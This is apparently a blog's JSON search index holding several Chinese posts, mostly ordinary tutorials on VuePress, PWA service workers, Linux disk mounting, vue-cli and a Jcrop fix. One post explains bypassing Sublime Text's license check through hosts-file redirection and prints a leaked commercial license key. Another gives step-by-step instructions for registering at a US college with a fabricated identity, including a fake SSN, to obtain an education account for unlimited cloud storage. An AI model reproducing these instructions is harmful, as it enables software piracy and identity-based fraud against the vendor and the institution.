遍历所有lang属性的标签赋值function registerWords() &#123; $(\"[lang]\").each(function () &#123; if ($(this).attr(\"lang\") === \"\") &#123; switch (this.tagName.toLowerCase()) &#123; case \"input\": $(this).attr(\"lang\", $(this).val()); break; default: $(this).attr(\"lang\", $(this).text()); &#125; &#125; &#125;); $(\"[lang-input]\").each(function () &#123; if ($(this).attr(\"lang-input\") === \"\") &#123; $(this).attr(\"lang-input\", $(this).attr(\"placeholder\")); &#125; &#125;);&#125; 之前弄demo的时候，registerWords函数这里没有判断但是我们的项目自己封装的路由去动态加载页面。每次进来都会重新赋值，这会导致问题。 因为他赋值的是当前元素的值，这个时候你lang的值就和语言包文件里的key对应不上了 使用方法html中语言切换：给所有标签加上lang属性js中语言切换：使用__tr()方法 可以直接把script.js作为一个插件使用放到项目中 总结条条大路通罗马，根据自己的实际需求与业务场景去做即可。 有点仓促，有不足的还请各位指点。","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"sublime注册码失效解决办法","slug":"sublime注册码失效解决办法","date":"2018-05-07T02:25:28.000Z","updated":"2021-11-15T07:55:36.541Z","comments":true,"path":"article/1806.html","link":"","permalink":"//www.shen.ee/article/1806.html","excerpt":"","text":"强烈推荐大家支持开发者购买正版授权！ 最近Sublime Text 3 增加了注册码验证功能，如果你使用共享版本的注册码，可能会提示注册码失效，但是却可以正常激活。 但是每次打开都让你重新注册，实属不符合我们这些懒癌患者。 两种方法解决： 修改host文件1.在你的host文件下面增加 123127.0.0.1 license.sublimehq.com127.0.0.1 45.55.255.55127.0.0.1 45.55.41.223 Windows C:\\Windows\\System32\\drivers\\etc Mac /Private/etc 2.然后进去sublime随便从网上找个注册码输入即可。 使用sublime2版本的注册码复制下面的注册码输入 1234567891011ZYNGA INC.50 User LicenseEA7E-811825927BA117 84C9300F 4A0CCBC4 34A56B44985E4562 59F2B63B CCCFF92F 0E646B830FD6487D 1507AE29 9CC4F9F5 0A6F32E30343D868 C18E2CD5 27641A71 25475648309705B3 E468DDC4 1B766A18 7952D28CE627DDBA 960A2153 69A2D98A C87C060745DC6049 8C04EC29 D18DFA40 442C680B1342224D 44D90641 33A3B9F2 46AADB8F 激活成功会进入这样的页面，我们点取消就行 该窗口的大致含义就是说你使用的 License 是一个 Sublime Text 2 版本的 Licence（当前是3），问你是否需要升级你的 Licence，这里我们点击取消不需要升级。 当然也可以两种方法都使用（修改host文件+sublime 2 的注册码），以防万一。","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"超详细动手搭建一个Vuepress站点及开启PWA与自动部署","slug":"超详细动手搭建一个Vuepress站点及开启PWA与自动部署","date":"2018-05-07T01:41:39.000Z","updated":"2021-11-15T07:55:36.547Z","comments":true,"path":"article/38692.html","link":"","permalink":"//www.shen.ee/article/38692.html","excerpt":"","text":"五一之前就想写一篇关于Vuepress的文章,结果朋友结婚就不了了之了。 记得最后一定要看注意事项！ Vuepress介绍官网：https://vuepress.vuejs.org/ 类似hexo一个极简的静态网站生成器,用来写技术文档不能在爽。当然搭建成博客也不成问题。 Vuepress特点 响应式,也可以自定义主题与hexo类似 内置markdown(还增加了一些扩展),并且可以在其使用Vue组件 Google Analytics 集成 PWA 自动生成Service Worker 快速上手安装初始化项目 12yarn init -y# 或者 npm init -y 安装vuepress 12yarn add -D vuepress# 或者 npm install -D vuepress 全局安装vuepress 12yarn global add vuepress# 或者 npm install -g vuepress 新建一个docs文件夹 1mkdir docs 设置下package.json 123456&#123; \"scripts\": &#123; \"docs:dev\": \"vuepress dev docs\", \"docs:build\": \"vuepress build docs\" &#125;&#125; 写作1yarn docs:dev # 或者：npm run docs:dev 也就是运行开发环境,直接去docs文件下书写文章就可以,打开http://localhost:8080/可以预览 构建build生成静态的HTML文件,默认会在 .vuepress/dist 文件夹下 1yarn docs:build # 或者：npm run docs:build 基本配置在 .vuepress目录下新建一个config.js,他导出一个对象 一些配置可以参考官方文档,这里我配置常用及必须配置的 网站信息1234567module.exports = &#123; title: '游魂的文档', description: 'Document library', head: [ ['link', &#123; rel: 'icon', href: `/favicon.ico` &#125;], ],&#125; 导航栏配置12345678910111213141516171819module.exports = &#123; themeConfig: &#123; nav: [ &#123; text: '主页', link: '/' &#125;, &#123; text: '前端规范', link: '/frontEnd/' &#125;, &#123; text: '开发环境', link: '/development/' &#125;, &#123; text: '学习文档', link: '/notes/' &#125;, &#123; text: '游魂博客', link: 'https://www.iyouhun.com' &#125;, // 下拉列表的配置 &#123; text: 'Languages', items: [ &#123; text: 'Chinese', link: '/language/chinese' &#125;, &#123; text: 'English', link: '/language/English' &#125; ] &#125; ] &#125;&#125; 如图： 侧边栏配置可以省略.md扩展名,同时以 / 结尾的路径将会被视为 */README.md 1234567module.exports = &#123; themeConfig: &#123; sidebar: &#123; '/frontEnd/': genSidebarConfig('前端开发规范'), &#125; &#125;&#125; 上面封装的genSidebarConfig函数 12345678910111213function genSidebarConfig(title) &#123; return [&#123; title, collapsable: false, children: [ '', 'html-standard', 'css-standard', 'js-standard', 'git-standard' ] &#125;]&#125; 支持侧边栏分组(可以用来做博客文章分类) collapsable是当前分组是否展开 123456789101112131415161718192021222324252627module.exports = &#123; themeConfig: &#123; sidebar: &#123; '/note': [ &#123; title:'前端', collapsable: true, children:[ '/notes/frontEnd/VueJS组件编码规范', '/notes/frontEnd/vue-cli脚手架快速搭建项目', '/notes/frontEnd/深入理解vue中的slot与slot-scope', '/notes/frontEnd/webpack入门', '/notes/frontEnd/PWA介绍及快速上手搭建一个PWA应用', ] &#125;, &#123; title:'后端', collapsable: true, children:[ 'notes/backEnd/nginx入门', 'notes/backEnd/CentOS如何挂载磁盘', ] &#125;, ] &#125; &#125;&#125; 如图： 默认主题修改主题色修改在.vuepress目录下的创建一个override.styl文件 1234$accentColor = #3eaf7c // 主题色$textColor = #2c3e50 // 文字颜色$borderColor = #eaecef // 边框颜色$codeBgColor = #282c34 // 代码背景颜色 自定义页面类有时需要在不同的页面应用不同的css,可以先在该页面中声明 123---pageClass: custom-page-class--- 然后在override.styl中书写 123.theme-container.custom-page-class &#123; /* 特定页面的 CSS */&#125; PWA设置设置serviceWorker为true,然后提供Manifest 和 icons,可以参考我之前的《PWA介绍及快速上手搭建一个PWA应用》 12345678module.exports = &#123; head: [ ['link', &#123; rel: 'icon', href: `/favicon.ico` &#125;], //增加manifest.json ['link', &#123; rel: 'manifest', href: '/manifest.json' &#125;], ], serviceWorker: true,&#125; 部署上线设置基础路径在config.js设置base例如：你想要部署在https://foo.github.io 那么设置base为/,base默认就为/,所以可以不用设置想要部署在https://foo.github.io/bar/,那么 base 应该被设置成 &quot;/bar/&quot; 123module.exports = &#123; base: '/documents/',&#125; base 将会自动地作为前缀插入到所有以 / 开始的其他选项的链接中,所以你只需要指定一次。 构建与自动部署用gitHub的pages或者coding的pages都可以,也可以搭建在自己的服务器上。将dist文件夹中的内容提交到git上或者上传到服务器就好 1yarn docs:build # 或者：npm run docs:build 另外可以弄一个脚本,设置持续集成,在每次 push 代码时自动运行脚本 deploy.sh 12345678910111213141516171819202122232425#!/usr/bin/env sh# 确保脚本抛出遇到的错误set -e# 生成静态文件npm run docs:build# 进入生成的文件夹cd docs/.vuepress/dist# 如果是发布到自定义域名# echo 'www.example.com' &gt; CNAMEgit initgit add -Agit commit -m 'deploy'# 如果发布到 https://&lt;USERNAME&gt;.github.io# git push -f git@github.com:&lt;USERNAME&gt;/&lt;USERNAME&gt;.github.io.git master# 如果发布到 https://&lt;USERNAME&gt;.github.io/&lt;REPO&gt;git push -f git@github.com:&lt;USERNAME&gt;/&lt;REPO&gt;.git master:gh-pagescd - 注意事项(坑) 把你想引用的资源都放在.vuepress目录下的public文件夹 给git仓库绑定了独立域名后,记得修改base路径 设置侧边栏分组后默认会自动生成 上/下一篇链接 设置了自动生成侧边栏会把侧边栏分组覆盖掉 设置PWA记得开启SSL","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"PWA介绍及快速上手搭建一个PWA应用","slug":"PWA初次体验","date":"2018-04-27T09:09:00.000Z","updated":"2021-11-15T07:55:36.537Z","comments":true,"path":"article/27276.html","link":"","permalink":"//www.shen.ee/article/27276.html","excerpt":"","text":"PWA初次体验 ​ 前言：本示例不用安装任何东西 部分资源来自网络资源及PWA官网，不要把PWA想象的太复杂，跟着示例走一下，你行的。 PWA介绍一个新的前端技术，PWA（ 全称：Progressive Web App ）也就是说这是个渐进式的网页应用程序。 官网：https://developers.google.com/web/progressive-web-apps/ 是 Google 在 2015 年提出，2016年6月才推广的项目。是结合了一系列现代Web技术的组合，在网页应用中实现和原生应用相近的用户体验。 官网上给出 PWA 的宣传是 ： Reliable （ 可靠的 ）、Fast（ 快速的 ）、Engaging（ 可参与的 ） Reliable ：当用户从手机主屏幕启动时，不用考虑网络的状态是如何，都可以立刻加载出 PWA。 Fast：这一点应该都很熟悉了吧，站在用户的角度来考虑，如果一个网页加载速度有点长的话，那么我们会放弃浏览该网站，所以 PWA 在这一点上做的很好，他的加载速度是很快的。 Engaging ： PWA 可以添加在用户的主屏幕上，不用从应用商店进行下载，他们通过网络应用程序 Manifest file 提供类似于 APP 的使用体验（ 在 Android 上可以设置全屏显示哦，由于 Safari 支持度的问题，所以在 IOS 上并不可以 ），并且还能进行 ”推送通知” 。 PWA关键技术 Service Worker （可以理解为服务工厂） Manifest （应用清单） Push Notification（推送通知） Service Worker以下用SW来表示 SW 是什么呢？这个是离线缓存文件。我们 PWA 技术使用的就是它！SW 是浏览器在后台独立于网页运行的脚本，它打开了通向不需要网页或用户交互的功能的大门，因为使用了它，才会有的那个 Reliable 特性吧，SW 作用于 浏览器于服务器之间，相当于一个代理服务器。 浏览器支持 顺便带一句：目前只能在 HTTPS 环境下才能使用SW，因为SW 的权利比较大，能够直接截取和返回用户的请求，所以要考虑一下安全性问题。 事件机制 功能(还是比较逆天的) 后台数据的同步 从其他域获取资源请求 接受计算密集型数据的更新，多页面共享该数据 客户端编译与依赖管理 后端服务的hook机制 根据URL模式，自定义模板 性能优化 消息推送 定时默认更新 地理围栏 生命周期 Parsed （ 解析成功 ）： 首次注册 SW 时，浏览器解决脚本并获得入口点，如果解析成功，就可以访问到 SW 注册对象，在这一点中我们需要在 HTML 页面中添加一个判断，判断该浏览器是否支持 SW 。 Installing （ 正在安装 ）：SW 脚本解析完成之后，浏览器会尝试进行安装，installing 中 install 事件被执行，如果其中有 event.waitUntil ( ) 方法，则 installing 事件会一直等到该方法中的 Promise 完成之后才会成功，如果 Promise 被拒绝，则安装失败，SW会进入 Redundant（ 废弃 ）状态。 Installed / Waiting （安装成功/等待中）：如果安装成功，SW 将会进入这个状态。 Activating （ 正在激活 ）：处于 waiting 状态的 SW 发生以下情况，将会进入 activating 状态中： 当前已无激活状态的 worker 、 SW脚本中的 self.skipWaiting（）方法被调用 （ ps： self 是 SW 中作用于全局的对象，这个方法根据英文翻译过来也能明白什么意思啦，跳过等待状态 ）、用户已关闭 SW 作用域下的所有页面，从而释放了当前处于激活状态的 worker、超出指定时间，从而释放当前处于激活状态的 worker Activated （ 激活成功 ）：该状态，其成功接收了 document 全面控制的激活态 worker 。 Redundant （ 废弃 ）：这个状态的出现时有原因的，如果 installing 事件失败或者 activating 事件失败或者新的 SW 替换其成为激活态 worker 。installing 事件失败和 activating 事件失败的信息我们可以在 Chrome 浏览器的 DevTools 中查看 一个很不错的全面介绍sw的教程：https://www.villainhr.com/page/2017/01/08/Service%20Worker%20%E5%85%A8%E9%9D%A2%E8%BF%9B%E9%98%B6 Manifest Web App Manifest 是一个 W3C 规范，它定义了一个基于 JSON 的 List 。Manifest 在 PWA 中的作用有： ​ 能够将你浏览的网页添加到你的手机屏幕上 ​ 在 Android 上能够全屏启动，不显示地址栏 （ 由于 Iphone 手机的浏览器是 Safari ，所以不支持哦） ​ 控制屏幕 横屏 / 竖屏 展示 ​ 定义启动画面 ​ 可以设置你的应用启动是从主屏幕启动还是从 URL 启动 ​ 可以设置你添加屏幕上的应用程序图标、名字、图标大小 Push NotificationPush 和 Notification 是两个不同的功能，涉及到两个 API 。 ​ Notification 是浏览器发出的通知消息。 ​ Push 和 Notification 的关系，Push：服务器端将更新的信息传递给 SW ，Notification： SW 将更新的信息推送给用户。 PWA示例准备 我们先创建一个关于 PWA 的项目文件夹， 进入文件夹下我们准备一张 120x120的图片一张，作为我们的应用程序图标。 创建一个 index.html 文件 创建一个 main.css 文件 创建一个 manifest.json 文件 创建一个 sw.js 文件 index.html 12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Hello PWA&lt;/title&gt; &lt;meta name=\"viewport\" content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\"&gt; &lt;link rel=\"stylesheet\" href=\"main.css\"&gt; &lt;link rel=\"manifest\" href=\"manifest.json\"&gt;&lt;/head&gt;&lt;body&gt; &lt;h3&gt;Hello PWA&lt;/h3&gt;&lt;/body&gt;&lt;script&gt; // 检测浏览器是否支持SW if(navigator.serviceWorker != null)&#123; navigator.serviceWorker.register('sw.js') .then(function(registartion)&#123; console.log('支持sw:',registartion.scope) &#125;) &#125;&lt;/script&gt;&lt;/html&gt; main.css 123h3&#123; color: #f00;&#125; manifest.json short_name: “ “ 用户主屏幕上的应用名字 display : “standalone” 设置启动样式，让您的网络应用隐藏浏览器的 URL 地址栏 start_url : “/“ 设置启动网址，如果不提供的话，默认是使用当前页面 theme_color : “ “ 用来告知浏览器用什么颜色来为地址栏等 UI 元素着色 background_color: “ ” 设置启动页面的背景颜色 icons：”” 就是添加到主屏幕之后的图标 123456789101112131415&#123; \"name\": \"一个PWA示例\", \"short_name\": \"PWA示例\", \"start_url\": \"/index.html\", \"display\": \"standalone\", \"background_color\": \"#fff\", \"theme_color\": \"#3eaf7c\", \"icons\": [ &#123; \"src\": \"/youhun.jpg\", \"sizes\": \"120x120\", \"type\": \"image/png\" &#125; ],&#125; sw.js 看网上很多人都安装的hs和ngrok去调试，在这里为了照顾新手我是直接引用的sw 处理静态缓存，首先定义需要缓存的路径，以及需要缓存的静态文件的列表。 借助 SW 注册完成安装 SW 时，抓取资源写入缓存中。使用了一个方法那就是 self.skipWaiting( ) ，为了在页面更新的过程当中，新的 SW 脚本能够立刻激活和生效。 123456789101112131415importScripts(\"https://storage.googleapis.com/workbox-cdn/releases/3.1.0/workbox-sw.js\");var cacheStorageKey = 'minimal-pwa-1'var cacheList=[ '/', 'index.html', 'main.css', 'youhun.jpg']self.addEventListener('install',e =&gt;&#123; e.waitUntil( caches.open(cacheStorageKey) .then(cache =&gt; cache.addAll(cacheList)) .then(() =&gt; self.skipWaiting()) )&#125;) 处理动态缓存，我们监听 fetch 事件，在 caches 中去 match 事件的 request ，如果 response 不为空的话就返回 response ，最后返回 fetch 请求，在 fetch 事件中我们可以手动生成 response 返回给页面。 更新静态资源，缓存的资源会跟随着版本的更新会过期的，所以会根据缓存的字符串名称清除旧缓存。在新安装的 SW 中通过调用 self.clients.claim( ) 取得页面的控制权，这样之后打开页面都会使用版本更新的缓存。旧的 SW 脚本不在控制着页面之后会被停止，也就是会进入 Redundant 期。 123456789101112131415161718192021222324252627self.addEventListener('fetch',function(e)&#123; e.respondWith( caches.match(e.request).then(function(response)&#123; if(response != null)&#123; return response &#125; return fetch(e.request.url) &#125;) )&#125;)self.addEventListener('activate',function(e)&#123; e.waitUntil( //获取所有cache名称 caches.keys().then(cacheNames =&gt; &#123; return Promise.all( // 获取所有不同于当前版本名称cache下的内容 cacheNames.filter(cacheNames =&gt; &#123; return cacheNames !== cacheStorageKey &#125;).map(cacheNames =&gt; &#123; return caches.delete(cacheNames) &#125;) ) &#125;).then(() =&gt; &#123; return self.clients.claim() &#125;) )&#125;) 部署 我们可以把当前pwa目录的所有内容都扔进服务器中，或者coding Pages和gitHub Pages也是可以的，当然，记得开启https。在上边介绍过SW的权利比较大，为了安全性，我们使用https协议来访问。 试着访问一下，我们这里用的coding Pages并且绑定了自己的域名 打开 chrom 的调试工具，打开 application ，点击 service workers 之后我们会发现 sw.js 脚本已经存到了 SW 中 。 我们打开 Network 刷新页面一下，看看，我们的页面资源来自 SW 而不是其他的地方，在 Console 中也打印出了我们在 index.html 中判断的语句，浏览器支持就会打印出这一句话。 接下来我们断网操作，在 Application 中给 Offline 打上对勾就行啦。然后刷新页面，我们仍然能看到之前的页面，原因就是我们在上图看到，他的资源是从 SW 上获得到的。当我们第一次打开这个页面的时候，Resopnse 对象被存到了 Cache Storage （ 定义在 SW 规范中 ，相关资料请同学们自行查询啦 ）中，我们看下图： 通过存放到 Cache Storage 中，我们下次访问的时候如果是弱网或者断网的情况下，就可以不走网络请求，而直接就能将本地缓存的内容展示给用户，优化用户的弱网及断网体验。 这个时候肯定会有同学在想，如果内容更新了，那么页面展示的内容是新内容呢还是旧内容呢？下面我们操作一下，打开 index.html 文件，我们在 body 中添加一个 p 标签 ，然后回到页面刷新。 我们看到，页面上的内容并没有显示出我刚刚添加的那个 p 标签。这说明了，我们拿到的数据还是从 Cache Storage 中获取到的，Cache Storage中的内容并没有更新，强制刷新也不行哦，那么我们怎么才能让我刚刚添加的那个 p 标签显示出来呢。 我们打开 sw.js 脚本文件，我们修改一下 cacheStorageKey。 修改后，我们再次打开该网址，强制刷新下或者关掉浏览器重新打开。 页面中出现了刚刚添加的P标签，我们再看一下 Cache Storage 中的缓存名字，已经被修改。 总结如果是使用coding或者gitHub提供的pages服务，则需要注意最好绑定下独立域名。如果不绑定则注意下文件请求路径即可。 研究PWA门槛不低，部署的服务器要求HTTPS，ServiceWorker涉及API众多，需要单独学习，另外npm中也已经有这个包了https://www.npmjs.com/package/web-pwa ，玩玩可以，真正部署到项目生产环境可能坑很多，但有坑填坑，不折腾还叫前端么。","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"Linux硬盘分区，卸载，挂载，格式化，加到开机启动项","slug":"CentOS如何挂载磁盘","date":"2018-04-24T10:22:40.000Z","updated":"2021-11-15T07:55:36.536Z","comments":true,"path":"article/27258.html","link":"","permalink":"//www.shen.ee/article/27258.html","excerpt":"","text":"卸载磁盘 12umount 挂载目录 分区名#例如 umount /data/ /dev/vdb 0、创建挂载目录 1mkdir -p /www 1、确认是否有没有分区的磁盘,如下图，没有分区的磁盘是 /dev/xvdb ,在您的服务器中可能是 /dev/vdb 请注意按实际名称修改 1fdisk -l 2、为磁盘分区，若已分区的，请跳过！ 1fdisk /dev/xvdb 3、输入n开始创建分区 4、输入p创建主分区 5、选择分区号，这里输入1 6、输入分区开始位置，直接回车 7、输入分区结束位置，直接回车 8、输入wq 保存退出 9、检查是否分区成功 1fdisk -l 10、格式化分区，这里请输入你看到的磁盘加分区号，如下图，已格式化过的，请跳过 12mkfs.ext4 /dev/xvdb1# (linux老的磁盘分区用的是 ext2 和 ext3 ，现在最新的是 ext4) 11、将新建的分区挂载到/www目录下 1mount /dev/xvdb1 /www 12、查询磁盘分区UUID 说明：磁盘的UUID（universally unique identifier）是Linux系统为存储设备提供的唯一的标识字符串。 12blkid /dev/xvdb1# 这里查询一下是为了下一步加到开机启动项 13、将分区挂载信息添加到开机启动挂载 1234567echo \"/dev/xvdb1 /www ext4 defaults 0 0\" &gt;&gt; /etc/fstab# 也可以直接修改/etc/fstab文件，在最后加一段# /dev/xvdb1 /www ext4 defaults 0 0# 推荐使用UUID来配置自动挂载数据盘，防止存储设备在服务器中发生改变echo \"UUID=f5c5c392-4704-4475-9abc-f6a2e049f2ea /www ext4 defaults 0 0\" &gt;&gt; /etc/fstab 格式说明： 第1列是需要挂载的文件系统或存储设备，/dev/xvdb1代表哪个分区 第2列是挂载点 第3列指定文件系统或分区的类型，ext4是该分区的格式 第4列为挂载选项，详细参考manmount. ，defaults是挂载时所要设定的参数(只读，读写，启用quota等)，输入defaults包括的参数有(rw、dev、exec、auto、nouser、async) ， 第5列为dump选项，设置是否让备份程序dump备份文件系统，0为忽略，1为备份。 第6列为fsck选项，告诉fsck程序以什么顺序检查文件系统，（2是开机时检查的顺序），是boot系统文件就为1，其他文件系统都为2，如不要检查就为0 13、重新挂载所有分区 1mount -a 14、检查是否挂载成功 1df","categories":[{"name":"后端","slug":"后端","permalink":"//www.shen.ee/categories/后端/"}],"tags":[],"keywords":[{"name":"后端","slug":"后端","permalink":"//www.shen.ee/categories/后端/"}]},{"title":"Vue-cli脚手架快速搭建项目图文教程","slug":"vue-cli脚手架快速搭建项目","date":"2018-04-12T02:20:58.000Z","updated":"2021-11-15T07:55:36.541Z","comments":true,"path":"article/39917.html","link":"","permalink":"//www.shen.ee/article/39917.html","excerpt":"","text":"​ 前言：比较基础的教程，大神自行忽略 脚手架是什么？“脚手架”是一种元编程的方法，用于构建基于数据库的应用。许多MVC框架都有运用这种思想。程序员编写一份specification（规格说明书），来描述怎样去使用数据库；而由（脚手架的）编译器来根据这份specification生成相应的代码，进行增、删、改、查数据库的操作。我们把这种模式称为”脚手架”，在脚手架上面去更高效的建造出强大的应用！ 好吧，其实说白点就是可以快速帮你搭建一个项目的基础架子，你直接拿过来用然后添加新项目需要的东西。 准备工作安装node首先我们需要安装node环境，官网https://nodejs.org下载安装包。 安装完成后可以，可以命令行工具中输入 node -v 和 npm -v，如果能显示出版本号，就说明安装成功。 安装 Vue-cli首先全局安装 vue-cli 1npm install -g vue-cli 安装完成后 同样适用命令行工具 输入 vue -V 记住 大写V ! 大写V ! 大写V ! 生成项目首先需要在命令行中进入到项目目录，然后输入： 1vue init webpack Vue-Project Vue-Project 是自定义的项目名称，命令执行之后，会在当前目录生成一个以该名称命名的项目文件夹,如下图 初始化，安装依赖 如果跟我一样没有立即执行npm装包，那么咱们可以手动 执行去安装依赖 1npm install 安装依赖完成 run 1npm run dev 浏览器打开http://localhost:8080/#/ ，会看到欢迎页： build 1npm run build 打包后会生成dist文件夹 打开dist文件夹下新生成的index.html文件，会发现页面空白，打开控制台会发现页面中引用的css和js文件都找不到： 说明引用路径错了，需要手动修改： 进入config/index.js 如果本地的8080端口被占用，可以修改端口号。 打包上线 打包完成后，会生成 dist 文件夹，如果已经修改了文件路径，可以直接打开本地文件查看 项目上线时，只需要将 dist 文件夹放到服务器就行了。","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"不限容量的网盘-可作为电脑磁盘","slug":"不限容量的网盘，可作为电脑磁盘","date":"2018-03-22T11:22:01.000Z","updated":"2021-11-15T07:55:36.542Z","comments":true,"path":"article/6592.html","link":"","permalink":"//www.shen.ee/article/6592.html","excerpt":"","text":"不限容量的网盘—可作为电脑磁盘实测，5分钟可以搞定申请，再花5分钟等邮件，就能玩上无限大的谷歌网盘。 先奉上成品截图 全程完整展示，每一步都截图给你，细不细hen贴心？ 先打一针，以下全程需要特殊网络，能打开谷歌那种网络。手机操作可能出现奇怪问题。 first，去虚拟身份网站。 在此游魂提供两个网站http://t.cn/REMDIU2或者http://suo.im/3dL5kG get一个美区虚拟身份。 注意，XXX的信息，需要登陆网站才会显示。 get信息后，去申请网站的账号。你没看错，申请X2。开通这个教育版账号，需要另一套申请系统的账号。 申请地址 需要用到你自己邮箱，尽量用谷歌邮箱，尽量用国外邮箱，QQ之类还是自己留着玩吧。 填入虚拟的姓名。 其他都可以选No。 填入对应的生日。 关键信息，务必截图保存！！！ 填入对应的SSN。 据说也可以勾选没有SSN，不过我没试过。 填入自己的邮箱。 Repeat，尽量用谷歌邮箱，尽量用国外邮箱。 填入虚拟的手机号。 填一个就行，第二个空着不用管。 填入对应的地址。 虚拟地址，有可能会报错。 别急，报错后，勾上最下面的选项。 设置你想要的用户名和密码。 注意，密码仅限数字和字母，不能用符号，否则报错。 设置你想要的安全码。 注意，安全码仅限数字，4位数字。 设置你想要的安全问题和答案。 进行人机身份验证。 这玩意是谷歌的，So，你懂的。 验证通过后，申请网站的账号就已申请到。 休 息 一 会 开始申请教育版账号。 框中的学校，不要选错。如图这个才是对的。 会先哔哔一些注意事项，不用细看，直接开始。 注意，以下都是选择题，看得懂就自己选，偷懒就跟我选一样滴。 确认学期和专业。 确认个人信息。 勾选下面这个就行，不用再填一遍。 继续确认个人信息，选择性别以及。。。性取向。 还要选择以下这3样。 确认受教育水平。 确认公民信息。 确认居住信息。 确认兴趣爱好。 确认一些额外信息。 能选不想回答的问题，就都不想回答。 确认接受各种条款。 复查之前的各种选择。 直接拖到下方，提交申请。 还没完，打勾确认隐私条款。 之后，你的申请才能正式提交。 再 休 息 一 会 等3到5分钟，邮箱里会收到几封邮件，其中一封会带上你的教育ID。 收到ID，才算是申请成功。之后，用这ID去管理系统，get教育邮箱。 登陆账号管理系统。 邮箱里有地址，这里也奉上地址 之前截图保存的信息有用了。默认密码是你最开始填写的生日信息，按月日年排布。比如我申请时用的06.17.1998，转换后就是061798。 首次登陆，提示需要升级账号。 那就升级呗，升级前会重复一遍账号密码。 同意各种条款。 设置安全问题。 修改登陆密码。 再次登陆账号管理系统。 还会哔哔一堆，不用细看，挨个确认就行。 终于，特么终于进入管理系统。 功能很多，基本用不上，除了邮箱的快捷入口。 直接看页面最下方吧，才是我们需要的信息：邮箱账户名和邮箱地址。 注意，实际使用时，不要直接复制，把大写字母换成小写才能用。 用邮箱地址，登入谷歌邮箱，没毛病。 用邮箱地址，登入谷歌网盘，也没毛病。 看看网盘容量。 仔细看几遍。 安装谷歌官方的管理软件。 1EB的电脑硬盘，嘿嘿。 这教育账号还有个小福利。 可以开通微软Office365教育版，能用在线版Office，以及微软的OneDrive网盘。 地址 药丸从速，随时会凉。文章转载自不翻车。","categories":[{"name":"资源","slug":"资源","permalink":"//www.shen.ee/categories/资源/"}],"tags":[{"name":"无限网盘","slug":"无限网盘","permalink":"//www.shen.ee/tags/无限网盘/"}],"keywords":[{"name":"资源","slug":"资源","permalink":"//www.shen.ee/categories/资源/"}]},{"title":"使用jQuery Jcrop 图像裁剪无法更换图片的坑","slug":"[记]使用jQuery Jcrop 图像裁剪的坑","date":"2018-03-21T09:46:44.000Z","updated":"2021-11-15T07:55:36.539Z","comments":true,"path":"article/39946.html","link":"","permalink":"//www.shen.ee/article/39946.html","excerpt":"","text":"[记]使用jQuery Jcrop 图像裁剪的坑 ​ 因为公司需求，需要完成一个显示屏定制的业务，用户自主上传图片然后在线裁剪的功能，我选择了jQuery Jcrop这个插件。 先看看怎么使用 使用方法载入 CSS 文件1&lt;link rel=\"stylesheet\" href=\"jquery.Jcrop.css\"&gt; 载入 JavaScript 文件12&lt;script src=\"jquery.js\"&gt;&lt;/script&gt;&lt;script src=\"jquery.Jcrop.js\"&gt;&lt;/script&gt; 给 IMG 标签加上 ID1&lt;img id=\"element_id\" src=\"pic.jpg\"&gt; 调用 Jcrop1$('#element_id').Jcrop(); 就不展示具体代码了，最终实现的图需要是这样。 实际操作重点来了，敲黑板 举个栗子：当你上传一张图片后裁剪，忽然这个时候你发现当前图片可能不适用，当你重新上传图片后，发现裁剪后的图片变了，但是上传的图片没变。如下图 这就很尴尬了，于是我就看上传后的图片地址 可以看下我的标注,其实你重新上传后，原图片地址已经改变了，但是jcorp操作的不是原始的img那个对象了，是jcorp生成的img对象。 这不是玩我么，于是一顿百度谷歌搜索看看有没有大佬遇到过，还是有发现的。 有人说使用jcorp的setImage方法设置图片地址，也有人说把定义的jcrop_api, boundx, boundy变成全局变量（变量名不是固定的， 你定义成什么就用什么）。boundx和boundy是用于记录选择的原始图片尺寸与在弹窗上展现尺寸的缩小/放大比例的，前面的jcrop_api变量用于获取到所有jcropd 的API。 也不知道是我操作失误，还是就是这个插件年久失修，我用了上面的所有解决方案都是不行。 于是乎我决定另辟蹊径，为何我不上传图片时直接操作jcrop的IMG对象呢？把上传后的图片地址赋值给Jcrop的图片地址。 12345678910var reader = new FileReader();reader.onload = function (evt) &#123;$('#uploadImg').attr(\"src\", evt.target.result)$('#jcropImg').attr(\"src\", evt.target.result)$('#preview').removeClass(\"hidden\");$('.preview-container').removeClass(\"hidden\");$(\".jcrop-holder img\").attr(\"src\",$('#uploadImg').attr(\"src\")) //这里就是直接操作的Jcrop previewNewImg() //裁剪方法&#125;reader.readAsDataURL(file.files[0]); ok，大功告成。 总结偷了个懒，直接使用插件裁剪，但是Jcrop这个裁剪插件最后一次更新是14年，所以说可能遗留了很多问题，虽然是一个骚操作，但是实属无奈之举，有朋友有更好的解决方法请不要吝啬。","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"深入理解vue中的slot与slot-scope","slug":"深入理解vue中的slot与slot-scope","date":"2018-03-15T07:47:24.000Z","updated":"2021-11-15T07:55:36.547Z","comments":true,"path":"article/54364.html","link":"","permalink":"//www.shen.ee/article/54364.html","excerpt":"","text":"深入理解vue中slot与slot-scope写在前面vue中关于插槽的文档说明很短，语言又写的很凝练，再加上其和methods，data，computed等常用选项使用频率、使用先后上的差别，这就有可能造成初次接触插槽的开发者容易产生“算了吧，回头再学，反正已经可以写基础组件了”，